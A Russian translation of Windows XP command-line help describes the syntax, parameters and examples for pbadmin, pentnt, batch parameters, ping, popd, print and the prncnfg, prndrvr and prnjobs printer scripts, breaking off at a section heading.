    Создает телефонную книгу (.mdb). Параметр имя_телефонной_книги задает имя создаваемого файла.
/I имя_телефонной_книги
    Импортирует данные в телефонную книгу (.mdb) из файла области (.txt) или файла телефонной книги (.pbk или .txt) Параметр имя_телефонной_книги задает телефонную книгу, в которую будут импортироваться данные. Параметр /R или /P используется совместно с параметром /I.
/R путь_файла_области\имя_файла_области
    Задает имя и путь файла области, который нужно импортировать в телефонную книгу.
/P путь_файла_данных\имя_файла_данных
    Задает имя и местоположение файла телефонной книги (.pbk или .txt), который нужно импортировать в телефонную книгу.
/O имя_телефонной книги_имя_сервера_имя_пользователя_пароль
    Настраивает параметры телефонной книги. Параметр имя_телефонной книги задает имя телефонной книги для настройки ее параметров. Параметр имя_сервера задает имя сервера, на котором будет опубликована телефонная книга. Параметр имя_пользователя задает учетную запись пользователя с разрешениями FTP на сервере с установленной службой телефонной книги (PBS). Параметр пароль задает пароль для учетной записи пользователя на сервере PBS.
/B имя_телефонной_книги
    Публикует телефонную книгу Параметр имя_телефонной_книги задает имя телефонной книги для ее публикации. Перед использованиемпараметра /B требуется настроить телефонную книгу с помощью параметра /O.
/?
    Отображает справку в командной строке.

Примечания
- Для создания телефонной книги (.mdb) используйте команду:

pbadmin.exe /N имя_телефонной_книги [/R путь_файла_области\имя_файла_области] [/P путь_файла_данных\имя_файла_данных]
- Для импортирования данных в телефонную книгу из файла области используйте команду:

pbadmin.exe /I имя_телефонной_книги /R путь_файла_области\имя_файла_области
- Для импортирования данных в телефонную книгу из файла телефонной книги (.pbk) или отформатированного соответствующим образом текстового файла (.txt) используйте команду:

pbadmin.exe /I имя_телефонной_книги /P путь_файла_данных\имя_файла_данных
- Для настройки параметров публикации для телефонной книги используйте команду:

pbadmin.exe /O имя_телефонной_книги_имя_сервера_имя_пользователя_пароль
- Для публикации телефонной книги используйте команду:

pbadmin.exe /B имя_телефонной_книги
- Для команды pbadmin термин «телефонная книга» означает телефонную книгу (.mdb), а термин «файл телефонной книги» означает файл телефонной книги (.pbk).- Параметры командной строки вводятся с учетом регистра. - Имя телефонной книги не должно быть более восьми символов, не может состоять только из цифр и не может содержать пробелы или любые из следующих символов: ! , ; * = / \ : ? ' " < > | . & % {} [] @ ( ) ? ` ~ - При задании пути необходимо задать полный путь. В путь к телефонной книге, файлу телефонной книги или файлу области нельзя вставлять пробелы.- Перед использованием команды pbadmin требуется установить администратор телефонной книги (PBA), а затем из каталога PBA запустить эту команду. Для установки администратора телефонной книги вставьте установочный компакт-диск Windows XP Professional или Windows 2000 в дисковод и щелкните Обзор этого компакт-диска. Последовательно откройте папки VALUEADD, MSFT, MGMT и PBA. Дважды щелкните PBAINST и следуйте инструкциям, отображаемым на экране.
Примеры

В примере, приведенном ниже, используются вымышленные данные.

Для создания телефонной книги с именем Awesome введите:

pbadmin.exe /N Awesome

Для импортирования данных в телефонную книгу с именем Awesome из файла области с именем Region1.txt, находящегося в каталоге C:\Temp, введите:

pbadmin.exe /I Awesome /R C:\Temp\Region1.txt

Для настройки параметров телефонной книги с именем Awesome, именем сервера Rainier, именем пользователя jobrown и паролем mypassword введите:

pbadmin.exe /O Awesome Rainier jobrown mypassword

Для публикации телефонной книги с именем Awesome введите:

pbadmin.exe /B Awesome
========================================================================================
Pentnt

Обнаруживает ошибки деления с плавающей точкой процессора Pentium, отключает аппаратную обработку чисел с плавающей точкой и включает эмуляции операций с плавающей точкой.
Синтаксис

pentnt [-c] [-f] [-o]
Параметры

-c
    Включает условную эмуляцию. 
-f
    Включает безусловную эмуляцию.
-o
    Отключает безусловную эмуляцию и повторно включает аппаратную обработку (если есть).
/?
    Отображает справку в командной строке.

Примечания
- Перед параметрами данной команды должен стоять - ( дефис), а не / (косая черта). - Использование параметра командной строки -c

Эмуляция включается тогда и только тогда, когда система распознает ошибку деления с плавающей точкой процессора Pentium в момент загрузки. При задании этого параметра компьютер следует перезапустить, чтобы изменения вступили в силу.
- С помощью параметра командной строки -f аппаратная обработка чисел с плавающей запятой отключается и включается эмуляция независимо от наличия ошибки процессора Pentium. Этот параметр полезен при проверке программных эмуляторов и для работы с ошибками вычислений с плавающей точкой, известными операционной системе. При задании этого параметра компьютер следует перезапустить, чтобы изменения вступили в силу. - При задании параметра -o при выборе этого параметра компьютер следует перезапустить, чтобы изменения вступили в силу. ========================================================================================
Использование пакетных параметров командной строки

Пакетные параметры командной строки используются в пакетном файле для получения информации о настройках среды.

Файл Cmd.exe разворачивает переменные с %0 по %9. При использовании пакетных параметров переменная %0 заменяется на имя пакетного файла, а переменные с %1 по %9 — на соответствующие аргументы, напечатанные в командной строке. Для доступа к переменным больше %9 запустите команду shift. Для получения дополнительных сведений о команде shift смотрите раздел Shift. Параметр %* ссылается на все аргументы, которые передаются пакетному файлу, за исключением параметра %0.

Например, для копирования содержимого из папки 1 (Folder1) в папку 2 (Folder2), где параметр %1 заменяется на значение Folder1, а параметр %2 — на значение Folder2, в пакетном файле с именем Mybatch.bat введите следующую строку:

xcopy %1\*.* %2

Для запуска файла введите:

mybatch.bat C:\folder1 D:\folder2

Результат будет таким же, как и при записи в пакетный файл строки:

xcopy C:\folder1 \*.* D:\folder2

С пакетными параметрами можно также использовать модификаторы. Модификаторы используют информацию о текущем диске и каталоге как часть или полное имя файла или каталога. Для использования модификатора напечатайте символ (%), затем символ тильды (~), а затем соответствующий модификатор (т.е., %~модификатор).

В следующей таблице описаны модификторы, используемые для расширения.
Модификатор     Описание
%~1     расширение %1 и удаление любых кавычек ("")
%~f1     замена %1 полным путем
%~d1     замена %1 именем диска
%~p1     замена %1 путем
%~n1     замена %1 именем файла
%~x1     замена %1 расширением имени файла
%~s1     замена путем, содержащим только короткие имена
%~a1     Замена %1 атрибутами файла
%~t1     замена %1 датой и временем модификации файла
%~z1     замена %1 размером файла
%~$PATH:1     поиск в каталогах, перечисленных в переменной среды PATH, замена %1 полным именем первого найденного файла. Если переменная среды не определена или поиск не обнаружил файлов, модификатор выдает пустую строку.

В следующей таблице даны возможные комбинации модификаторов и квалификаторов для получения более сложных результатов.
Модификатор     Описание
%~dp1     замена %1 именем диска и путем
%~nx1     замена %1 именем файла и расширением
%~dp$PATH:1     поиск в каталогах, перечисленных в переменной среды PATH, и замена %1 именем диска и путем к первому найденному файлу.
%~ftza1     замена %1 строкой, аналогичной результату работы программы dir

Примечание
- %1 и PATH в показанных выше примерах можно заменить на другие значения пакетных параметров.

Модификатор %* является уникальным, так как он представляет все аргументы, переданные пакетному файлу. Этот модификатор не используется в комбинации с модификатором %~. Конструкция %~ должна завершаться допустимым номером аргумента.

Нельзя манипулировать пакетными параметрами подобно переменным среды. Нельзя искать и заменять значения или контролировать подстроки. Но переменной среды можно назначить параметр, а потом уже ей манипулировать.
========================================================================================
Ping

С помощью отправки сообщений с эхо-запросом по протоколу ICMP проверяет соединение на уровне протокола IP с другим компьютером, поддерживающим TCP/IP. После каждой передачи выводится соответствующее сообщение с эхо-ответом. Ping - это основная TCP/IP-команда, используемая для устранения неполадки в соединении, проверки возможности доступа и разрешения имен. Команда ping, запущенная без параметров, выводит справку.
Синтаксис

ping [-t] [-a] [-n счетчик] [-l размер] [-f] [-i TTL] [-v тип] [-r счетчик] [-s счетчик] [{-j список_узлов | -k список_узлов}] [-w интервал] [имя_конечного_компьютера]
Параметры

-t
    Задает для команды ping отправку сообщений с эхо-запросом к точке назначения до тех пор, пока команда не будет прервана. Для прерывания команды и вывода статистики нажмите комбинацию CTRL-BREAK. Для прерывания команды ping и выйхода из нее нажмите клавиши CTRL-C.
-a
    Задает разрешение обратного имени по IP-адресу назначения. В случае успешного выполнения выводится имя соответствующего узла.
-n счетчик
    Задает число отправляемых сообщений с эхо-запросом. По умолчанию — 4.
-l размер
    Задает длину (в байтах) поля данных в отправленных сообщениях с эхо-запросом. По умолчанию — 32 байта. Максимальный размер — 65527.
-f
    Задает отправку сообщений с эхо-запросом с флагом «Don't Fragment» в IP-заголовке, установленном на 1. Сообщения с эхо-запросом не фрагментируются маршрутизаторами на пути к месту назначения. Этот параметр полезен для устранения проблем, возникающих с максимальным блоком данных для канала (Maximum Transmission Unit).
-i TTL
    Задает значение поля TTL в IP-заголовке для отправляемых сообщений с эхо-запросом. По умолчанию берется значение TTL, заданное по умолчанию для узла. Для узлов Windows XP это значение обычно равно 128. Максимальное значение TTL — 255.
-v тип
    Задает значение поля типа службы (TOS) в IP-заголовке для отправляемых сообщений с эхо-запросом. По умолчанию это значение равно 0. тип — это десятичное значение от 0 до 255.
-r счетчик
    Задает параметр записи маршрута (Record Route) в IP-заголовке для записи пути, по которому проходит сообщение с эхо-запросом и соответствующее ему сообщение с эхо-ответом. Каждый переход в пути использует параметр записи маршрута. По возможности значение счетчика задается равным или большим, чем количество переходов между источником и местом назначения. Параметр счетчик имеет значение от 1 до 9.
-s счетчик
    Указывает вариант штампа времени Интернета (Internet Timestamp) в заголовке IP для записи времени прибытия сообщения с эхо-запросом и соответствующего ему сообщения с эхо-ответом для каждого перехода. Параметр счетчик имеет значение от 1 до 4.
-j список_узлов
    Указывает для сообщений с эхо-запросом использование параметра свободной маршрутизации в IP-заголовке с набором промежуточных точек назначения, указанным в списке_узлов. При свободной маршрутизации последовательные промежуточные точки назначения могут быть разделены одним или несколькими маршрутизаторами. Максимальное число адресов или имен в списке узлов — 9. Список узлов — это набор IP-адресов (в точечно-десятичной нотации), разделенных пробелами.
-k список_узлов
    Указывает для сообщений с эхо-запросом использование параметра строгой маршрутизации в IP-заголовке с набором промежуточных точек назначения, указанным в списке_узлов. При строгой маршрутизации следующая промежуточная точка назначения должна быть доступной напрямую (она должна быть соседней в интерфейсе маршрутизатора). Максимальное число адресов или имен в списке узлов равно 9. Список узлов — это набор IP-адресов (в точечно-десятичной нотации), разделенных пробелами.
-w интервал
    Определяет в миллисекундах время ожидания получения сообщения с эхо-ответом, которое соответствует сообщению с эхо-запросом. Если сообщение с эхо-ответом не получено в пределах заданного интервала, то выдается сообщение об ошибке "Request timed out". Интервал по умолчанию равен 4000 (4 секунды).
имя_конечного_компьютера
    Задает точку назначения, идентифицированную IP-адресом или именем узла.
/?
    Отображает справку в командной строке.

Примечания
- Команда ping позволяет проверить имя и IP-адрес компьютера. Если проверка IP-адреса успешная, и проверка имени — нет, то имеет место проблема разрешения имен. В этом случае с помощью запросов DNS (Domain Name System) или с помощью методов разрешения имен NetBIOS проверьте, чтобы имя задаваемого компьютера было разрешено в локальном файле Hosts. - Эта команда доступна только если в свойствах сетевого адаптера в объекте Сетевые подключения в качестве компонента установлен протокол Интернета (TCP/IP).
Примеры

Приведенный ниже пример содержит результаты работы команды ping:

C:\>ping example.microsoft.com

Pinging example.microsoft.com [192.168.239.132] with 32 bytes of data:

Reply from 192.168.239.132: bytes=32 time=101ms TTL=124

Reply from 192.168.239.132: bytes=32 time=100ms TTL=124

Reply from 192.168.239.132: bytes=32 time=101ms TTL=124

Reply from 192.168.239.132: bytes=32 time=101ms TTL=124

Для отправки сообщения точке назначения 10.0.99.221 и сопоставления с ее узловым именем введите:

ping -a 10.0.99.221

Для отправки точке назначения 10.0.99.221 десяти собщений с эхо-запросом, каждое из которых имеет поле данных из 1000 байт, введите:

ping -n 10 -l 1000 10.0.99.221

Для отправки сообщения точке назначения 10.0.99.221 и записи маршрута для 4 переходов введите:

ping -r 4 10.0.99.221

Для отправки сообщения точке назначения 10.0.99.221 и задания свободной маршрутизации для точек назначения 10.12.0.1-10.29.3.1-10.1.44.1 введите:

ping -j 10.12.0.1 10.29.3.1 10.1.44.1 10.0.99.221
========================================================================================
Popd

Изменяет текущий в каталог на каталог, сохраненный командой pushd.
Синтаксис

popd
Параметры

/?
    Отображает справку в командной строке.

Примечания
- Каждое выполнение команды pushd сохраняет один каталог. Запустив команду pushd несколько раз, можно сохранить несколько каталогов.
Каталоги сохраняются последовательно в виртуальном стеке. Если команда pushd выполняется один раз, то каталог, в котором используется команда, помещается в стеке вниз. Если запустить команду еще раз, второй каталог помещается над первым. Этот процесс повторяется при каждом вызове команды pushd .

Команду popd можно использовать для изменения текущего каталога на каталог, сохраненный последним командой pushd. Если используется команда popd, верхний каталог в стеке удаляется и текущий каталог заменяется на этот каталог. Если запустить команду popd еще раз, из стека будет удален следующий верхний каталог.- Если расширения командного процессора разрешены, то команда popd удаляет любые имена дисков, назначенные командой pushd.
Примеры

Команды pushd и popd можно использовать в пакетной программе для изменения текущего каталога, в котором она была запущена, и последующего возврата к нему. В приведенном ниже примере показано, как это сделать:

@echo off
rem Этот пакетный файл удаляет все файлы .txt в заданном каталоге
pushd %1
del *.txt
popd
cls
echo Все текстовые файлы в каталоге %1 удалены

========================================================================================
Print

Отправляет текстовый файл на принтер.
Синтаксис

print [/d:принтер] [диск:][путь] имя_файла [ ...]
Параметры

/d:принтер
    Задает имя принтера, на котором требуется напечатать файл. Можно задать локальный принтер, указав порт на компьютере, к которому подключен принтер. Допустимые значения для параллельных портов: LPT1, LPT2 и LPT3. Допустимые значения для последовательных портов: COM1, COM2, COM3 и COM4. Можно также задать сетевой принтер по его имени в сети (\\имя_сервера\имя_принтера). Если принтер не задан, то задание уйдет на печать в порт LPT1.
диск:
    Задает логический и физический диск, на котором находится файл, задаваемый на печать. Этот параметр не нужен, если файл для печати находится на текущем диске.
путь
    Задание местоположения файла на диске. Этот параметр не нужен, если файл для печати находится в текущем каталоге.
имя_файла [...]
    Обязательный параметр. Задает имя файла, который требуется напечатать. В одном вызове команды может быть задано несколько файлов.
/?
    Отображает справку в командной строке.

Примечания
-Если задание отправлено на принтер, подключенный к последовательному или параллельному портам локального компьютера, то печать будет осуществляться в фоновом режиме. -Большинство программ имеет встроенные возможности печати. Для печати файлов, созданных с помощью таких программ необходимо использовать команду print. - С помощью команды mode можно выполнить настройки в командной строке. Дополнительные сведения о настройках для принтера, подключенного к параллельному или последовательному порту, о выводе статуса принтера или подготовке принтера к использованию кодовых страниц см. в ссылке «» в разделе описания команды mode.
Примеры

Для отправки на печать файла Report.txt из текущего каталога на принтер, подключенный к порту LPT2 локального компьютера, введите:

print /d:LPT2 report.txt

Для отправки файла Report.txt из каталога c:\Accounting в очередь на печать принтера Printer1 на сервере \\CopyRoom введите:

print /d:\\copyroom\printer1 c:\accounting\report.txt
========================================================================================
Prncnfg.vbs

Настраивает или отображает параметры принтера. При вызове команды prncnfg.vbs без параметров в командной строке отображается справка по команде prncnfg.vbs.

Вывод параметров принтера
Синтаксис

cscript prncnfg.vbs -g [-s удаленный_компьютер] -p имя_принтера [-u имя_пользователя -w пароль]
Параметры

-g
    Обязательный параметр. Задает вывод параметров принтера.
-s удаленный_компьютер
    Задает имя удаленного компьютера, управляющего принтером, параметры которого требуется вывести на экран. Если компьютер не указан, то используется локальный компьютер.
-p имя_принтера
    Обязательный параметр. Задает имя принтера, параметры которого требуется вывести на экран.
-u имя_пользователя -w пароль
    Задает учетную запись с разрешениями подключаться с помощью инструментария управления Windows к компьютеру, подключенному к принтеру, параметры которого требуется вывести на экран. Все члены группы «Администраторы» имеют такие разрешения, но они могут быть даны и другим пользователям. Если учетная запись не задана, то для того, чтобы команда работала, необходимо войти в систему с учетной записью, имеющей такие разрешения. Для получения дополнительных сведений об инструментарии управления Windows (WMI) щелкните ссылку "".
/?
    Отображает справку в командной строке.

Примечания
- Эта команда запускает программу из каталога systemroot\system32. Она вводится в командной строке с этим каталогом, указанным в качестве текущего, или в начале команды cscript вводится полный путь к этому каталогу.- Если аргументы параметров команды содержат пробелы, их следует заключать в кавычки (например "имя компьютера").
Пример

Для вывода на экран параметров принтера с именем ColorPrinter_2, очередь печати которого находится на компьютере с именем HRServer,введите:

cscript prncnfg.vbs -g -s HRServer -p ColorPrinter_2

Настройка параметров принтера
Синтаксис

cscript prncnfg.vbs -t [-s удаленный_компьютер] -p имя_принтера [-u имя_пользователя -w пароль] [-r имя_порта] [-l путь] [-m комментарий] [-h имя_ресурса] [-f разделитель] [-y тип_данных] [-st время_запуска] [-ut время_завершения] [-o приоритет] [-i приоритет_по_умолчанию] [{+ | -}shared] [{+ | -}direct] [{+ | -}published] [{+ | -}hidden] [{+ | -}rawonly] [{+ | -}queued] [{+ | -}keepprintedjobs] [{+ | -}workoffline] [{+ | -}enabledevq] [{+ | -}docompletefirst][{+ | -}enablebidi]
Параметры

-t
    Обязательный параметр. Задает настройку параметров принтера.
-s удаленный_компьютер
    Задает имя удаленного компьютера, подключенного к принтеру, параметры которого требуется настроить. Если компьютер не указан, используется локальный компьютер.
-p имя_принтера
    Обязательный параметр. Задает имя принтера, параметры которого требуется настроить.
-u имя_пользователя -w пароль
    Задает учетную запись с разрешениями подключаться с помощью инструментария управления Windows к компьютеру, подключенному к принтеру, параметры которого требуется настроить. Все члены группы «Администраторы» имеют такие разрешения, но они могут быть даны и другим пользователям. Если учетная запись не задана, то для того, чтобы команда работала, необходимо войти в систему с учетной записью, имеющей такие разрешения. Для получения дополнительных сведений об инструментарии управления Windows (WMI) щелкните ссылку "".
-r имя_порта
    Задает порт, к которому подключен принтер. Если это параллельный или последовательный порт, то используется его ID (например, LPT1 или COM1). Если это порт TCP/IP, то используется имя, заданное при добавлении порта. Для получения дополнительных сведений щелкните ссылку «».
-l путь
    Задает местоположение принтера, например, «Копировальный зал».
-m комментарий
    Задает строку комментариев.
-h имя_ресурса
    Задает сетевое имя принтера.
-f разделитель
    Задает файл с текстом, появляющимся на страницах-разделителях.
-y тип_данных
    Задает тип данных, которые принтер может обработать. Для получения дополнительных сведений о типах данных щелкните ссылку "".
-st время_запуска
    Настраивает принтер на работу в режиме, ограниченном во времени. Задает время, после которого принтер будет доступен. При отправке на приостановленный принтер документ будет храниться в очереди до тех пор, пока этот принтер вновь не станет доступным. Время отображается в 24-часовом формате. Например, для задания 23:00 введите 2300.
-ut время_завершения
    Настраивает принтер на работу в режиме, ограниченном во времени. Задает время, после которого принтер будет недоступен. При отправке на приостановленный принтер документ будет храниться в очереди до тех пор, пока этот принтер вновь не станет доступным. Время отображается в 24-часовом формате. Например, для задания 23:00 введите 2300.
-o приоритет
    Задает приоритет отправки задания на печать. Очередь печати с высшим приоритетом получает свои задания быстрее, чем любая очередь с низшим приоритетом.
-i приоритет_по_умолчанию
    Задает приоритет по умолчанию каждому заданию на печать.
{+ | -}shared
    Задает общий доступ к принтеру в сети.
{+ | -}direct
    Задает признак прямой отправки документа (минуя очередь) на устройство печати.
{+ | -}published
    Задает публикацию принтера в службе Active Directory. Если опубликовать принтер, то другие пользователи сети смогут искать его с помощью текущего местоположения и возможностей, например, цветной печати и сшивателя.
{+ | -}hidden
    Зарезервированный код.
{+ | -}rawonly
    Задает постановку в очередь только тех заданий, которые содержат исходные данные.
{+ | -}queued
    Задает признак начала печати документа после того, как его последняя страница окажется в очереди. Программа, отправившая документ на печать, недоступна до завершения печати. Эта задержка компенсируется тем, что документ доступен принтеру целиком.
{+ | -}keepprintedjobs
    Задает признак сохранения документа в очереди после его вывода на печать. Он дает возможность повторно печатать документ прямо из очереди, а не из программы печати.
{+ | -}workoffline
    Задает отправку документов в очередь на печать, если компьютер не подключен к сети.
{+ | -}enabledevq
    Задает параметр, позволяющий хранить в очереди задания, установки которых не совпадают с установками принтера (например, PostScript-файлы для принтеров, не поддерживающих язык PostScript) и не печатать их.
{+ | -}docompletefirst
    Задает параметр, устанавливающий, что диспетчер очереди печати должен отправить в соответствующую очередь задания с более низшим приоритетом, но уже поступившие в очередь, раньше отправки в эту же очередь заданий с более высшим приоритетом, находящихся в процессе поступления в очередь. Если этот параметр задан, а документов, закончивших поступление в очередь нет, то диспетчер очереди раньше отправит в очередь более крупные документы. Этот параметр повышает эффективность работы принтера с помощью приоритетов. Если он отключен, то диспетчер отсылает в соответствующие очереди задания с высшим приоритетом. 
{+ | -}enablebidi
    Задает отправку принтером диспетчеру очереди печати информации о статусе.
/?
    Отображает справку в командной строке.

Примечания
- Эта команда запускает программу из каталога systemroot\system32. Она вводится в командной строке с этим каталогом, указанным в качестве текущего, или в начале команды cscript вводится полный путь к этому каталогу.- Если аргументы параметров команды содержат пробелы, их следует заключать в кавычки (например "имя компьютера").
Пример

Для настройки принтера с именем ColorPrinter_2 на то, чтобы диспетчер очереди печати на удаленном компьютере с именем HRServer хранил задания после их печати, введите:

cscript prncnfg.vbs -t -s HRServer -p ColorPrinter_2 +keepprintedjobs

Изменение имени принтера
Синтаксис

cscript prncnfg.vbs -x [-s удаленный_компьютер] -p имя_принтера -z новое_имя_принтера [-u имя_польззователя -w пароль]
Параметры

-x
    Обязательный параметр. Задает изменение имени принтера. 
-s удаленный_компьютер
    Задает имя удаленного компьютера, подключенного к принтеру, имя которого требуется изменить. Если компьютер не указан, используется локальный компьютер.
-p имя_принтера
    Обязательный параметр. Задает текущее имя принтера.
-z новое_имя_принтера
    Обязательный параметр. Задает новое имя принтера.
-u имя_пользователя -w пароль
    Задает учетную запись с разрешениями подключаться, с помощью инструментария управления Windows к компьютеру, подключенному к принтеру, который требуется переименовать. Все члены группы «Администраторы» имеют такие разрешения, но эти разрешения могут быть даны и другим пользователям. Если учетная запись не задана, то для того, чтобы команда работала, необходимо войти в систему с учетной записью, имеющей такие разрешения. Для получения дополнительных сведений об инструментарии управления Windows (WMI) щелкните ссылку "".
/?
    Отображает справку в командной строке.

Примечания
- Эта команда запускает программу из каталога systemroot\system32. Она вводится в командной строке с этим каталогом, указанным в качестве текущего, или в начале команды cscript вводится полный путь к этому каталогу.- Если аргументы параметров команды содержат пробелы, их следует заключать в кавычки (например "имя компьютера").
Пример

Для изменения имени принтера с ColorPrinter_2 на ColorPrinter_3 на удаленном компьютере с именем HRServer введите:

cscript prncnfg.vbs -x -s HRServer -p ColorPrinter_2 -z ColorPrinter_3
========================================================================================
Prndrvr.vbs

Добавляет, удаляет и составляет списки драйверов. При вызове команды prndrvr.vbs без параметров в командной строке отображается справка по команде prndrvr.vbs.

Установка драйвера принтера
Синтаксис

cscript prndrvr.vbs -a [-m имя_драйвера] [-v {0 | 1 | 2 | 3}] [-e среда] [-s удаленный_компьютер] [-h путь] [-i имя_файла.inf] [-u имя_пользователя -w пароль]
Параметры

-a
    Обязательный параметр. Задает установку драйвера.
-m имя_драйвера
    Задает имя драйвера для установки. Часто драйверам присваиваютсся имена моделей принтеров, которые они поддерживают. Более подробные сведения о драйверах можно найти в документации оборудования.
-v {0 | 1 | 2 | 3}
    Задает версию драйвера для установки. Сведения об использовании версий драйверов определенными средами смотрите в описании параметра -e среда. Если версия драйвера не указана, то будет установлена версия, подходящая версии Windows, запущенной на компьютере, на котором устанавливается драйвер. - Версия 0 поддерживает Windows 95, Windows 98 и Windows Millennium Edition.- Версия 1 поддерживает Windows NT 3.51.- Версия 2 поддерживает Windows NT 4.0.- Версия 3 поддерживает Windows XP and Windows 2000.
-e среда
    Задает среду для драйвера, который требуется установить. Если среда не задана, то используется среда компьютера, на котором устанавливается драйвер. В следующей таблице представлено соответствие среды и версии драйвера.
Среда     Доступные версии
"Windows NT x86"     1, 2 и 3
"Windows NT Alpha_AXP"     1 и 2
"Windows IA64"     3
"Windows NT R4000"     1
"Windows NT PowerPC"     1
Windows 4.0     0
-s удаленныый_компьютер
    Задает имя удаленного компьютера, на котором требуется установить драйвер. Если компьютер не указан, то драйвер устанавливается на локальном компьютере.
-h путь
    Задает путь к файлу драйвера. Если путь не указан, то используется путь к местоположению, из которого была установлена Windows. 
-i имя_файла.inf
    Задает имя файла драйвера, который требуется установить. Если имя файла не указано, то используется ntprint.inf.
-u имя_пользователя -w пароль
    Задает учетную запись с разрешениями подключаться с помощью инструментария управления Windows к компьютеру, на котором требуется установить драйвер. Все члены группы «Администраторы» имеют такие разрешения, но они могут быть даны и другим пользователям. Если учетная запись не задана, то для того, чтобы команда работала, необходимо войти в систему с учетной записью, имеющей такие разрешения. Для получения дополнительных сведений об инструментарии управления Windows (WMI) щелкните ссылку "".
/?
    Отображает справку в командной строке.

Примечания
- Эта команда запускает программу из каталога systemroot\system32. Она вводится в командной строке с этим каталогом, указанным в качестве текущего, или в начале команды cscript вводится полный путь к этому каталогу.- Если аргументы параметров команды содержат пробелы, их следует заключать в кавычки (например "имя компьютера").
Пример

Для добавления 3 версии драйвера принтера с именем "Color Printer Driver 1" к локальному компьютеру с установленной Windows NT x86 введите:

cscript prndrvr.vbs -a -m "Color Printer Driver 1" -v 3 -e "Windows NT x86"

Удаление драйвера принтера
Синтаксис

cscript prndrvr.vbs -d [-s удаленный_компьютер] -m имя_драйвера -v {0 | 1 | 2 | 3} -e среда
[-u UserName -w пароль]
Параметры

-d
    Обязательный параметр. Задает удаление драйвера.
-s удаленный_компьютерr
    Задает имя удаленного компьютера, на котором требуется удалить драйвер. Если компьютер не указан, то драйвер удаляется на локальном компьютере.
-m имя_драйвера
    Обязательный параметр. Задает имя драйвера для удаления. Часто драйверам присваиваются имена моделей принтеров, которые они поддерживают. Более подробные сведения о драйверах можно найти в документации оборудования.
-v {0 | 1 | 2 | 3}
    Обязательный параметр. Указывает версию драйвера, который требуется удалить. Сведения об использовании версий драйверов определенными системами смотрите в описании параметра -e среда. - Версия 0 поддерживает Windows 95, Windows 98 и Windows Millennium Edition.- Версия 1 поддерживает Windows NT 3.51.- Версия 2 поддерживает Windows NT 4.0.- Версия 3 поддерживает Windows XP and Windows 2000.
-e среда
    Обязательный параметр. Задает среду для драйвера, который требуется удалить. В следующей таблице представлено соответствие среды и версии драйвера.
    Среда     Доступные версии
    "Windows NT x86"     1, 2 и 3
    "Windows NT Alpha_AXP"     1 и 2
    "Windows IA64"     3
    "Windows NT R4000"     1
    "Windows NT PowerPC"     1
    "Windows 4.0"     0
-u имя_пользователя -w пароль
    Задает учетную запись с разрешениями подключаться с помощью инструментария управления Windows к компьютеру, на котором требуется удалить драйвер. Все члены группы «Администраторы» имеют такие разрешения, но они могут быть даны и другим пользователям. Если учетная запись не задана, то для того, чтобы команда работала, необходимо войти в систему с учетной записью, имеющей такие разрешения. Для получения дополнительных сведений об инструментарии управления Windows (WMI) щелкните ссылку "".
/?
    Отображает справку в командной строке.

Примечания
- Эта команда запускает программу из каталога systemroot\system32. Она вводится в командной строке с этим каталогом, указанным в качестве текущего, или в начале команды cscript вводится полный путь к этому каталогу.- При удалении драйвера принтера необходимо включить и среду, и параметры версии.- Если аргументы параметров команды содержат пробелы, их следует заключать в кавычки (например "имя компьютера").

Составление списка драйверов принтера на компьютере
Синтаксис

cscript prndrvr.vbs -l [-s удаленный_компьютер] [-u имя_пользователя -w пароль]
Параметры

-l
    Обязательный параметр. Задает составление списка всех драйверов на удаленном компьютере.
-s удаленный_компьюте
    Указывает удаленный компьютер, драйверы которого требуется внести в список. Если компьютер не указан, то в список заносятся драйверы локального компьютера.
-u имя_пользователя -w пароль
    Задает учетную запись с разрешениями подключаться с помощью инструментария управления Windows к компьютеру, на котором требуется составить список драйверов. Все члены группы «Администраторы» имеют такие разрешения, но они могут быть даны и другим пользователям. Если учетная запись не задана, то для того, чтобы команда работала, необходимо войти в систему с учетной записью, имеющей такие разрешения. Для получения дополнительных сведений об инструментарии управления Windows (WMI) щелкните ссылку "".
/?
    Отображает справку в командной строке.

Примечания
- Эта команда запускает программу из каталога systemroot\system32. Она вводится в командной строке с этим каталогом, указанным в качестве текущего, или в начале команды cscript вводится полный путь к этому каталогу.- Если аргументы параметров команды содержат пробелы, их следует заключать в кавычки (например "имя компьютера").

Удаление всех неиспользуемых драйверов принтера из компьютера
Синтаксис

cscript prndrvr.vbs -l [-s удаленный_компьютер] [-u имя_пользователя -w пароль]
Параметры

-x
    Обязательный параметр. Задает удаление списка всех неиспользуемых драйверов принтера на компьютере.
-s удаленный_компьютер
    Задает имя удаленного компьютера, на котором требуется удалить драйверы. Если компьютер не указан, то драйверы удаляются на локальном компьютере.
-u имя_пользователя -w пароль
    Задает учетную запись с разрешениями подключаться с помощью инструментария управления Windows к компьютеру, на котором требуется удалить драйверы. Все члены группы «Администраторы» имеют такие разрешения, но они могут быть даны и другим пользователям. Если учетная запись не задана, то для того, чтобы команда работала, необходимо войти в систему с учетной записью, имеющей такие разрешения. Для получения дополнительных сведений об инструментарии управления Windows (WMI) щелкните ссылку "".
/?
    Отображает справку в командной строке.

Примечания
- Эта команда запускает программу из каталога systemroot\system32. Она вводится в командной строке с этим каталогом, указанным в качестве текущего, или в начале команды cscript вводится полный путь к этому каталогу.- Если аргументы параметров команды содержат пробелы, их следует заключать в кавычки (например "имя компьютера").
========================================================================================
Prnjobs.vbs

Приостанавливает, возобновляет, отменяет и перечисляет задания печати. При вызове команды prnjobs.vbs без параметров в командной строке отображается справка о команде prnjobs.vbs.

Приостановка выполнения задания
Синтаксис

cscript prnjobs -z [-s удаленный_компьютер] -p имя_принтера -j номер_задания [-u имя_пользователя -w пароль]
Параметры

-z
    Обязательный параметр. Задает приостановку печати задания.
-s удаленный_компьютер
    Задает имя компьютера, на который было отослано задание, которое требуется приостановить. Если компьютер не указан, используется локальный компьютер.
-p имя_принтера
    Обязательный параметр. Задает имя принтера, на котором будет распечатано задание, которое требуется приостановить.
-j номер_задания
    Обязательный параметр. Задает ID-номер задания, печать которого требуется приостановить.
-u имя_пользователя -w пароль
    Задает учетную запись с разрешениями подключаться с помощью инструментария управления Windows к компьютеру, на который отослано задание, печать которого требуется приостановить. Все члены группы «Администраторы» имеют такие разрешения, но они могут быть даны и другим пользователям. Если учетная запись не задана, то для того, чтобы команда работала, необходимо войти в систему с учетной записью, имеющей такие разрешения. Для получения дополнительных сведений об инструментарии управления Windows (WMI) щелкните ссылку "".
/?
    Отображает справку в командной строке.

Примечания
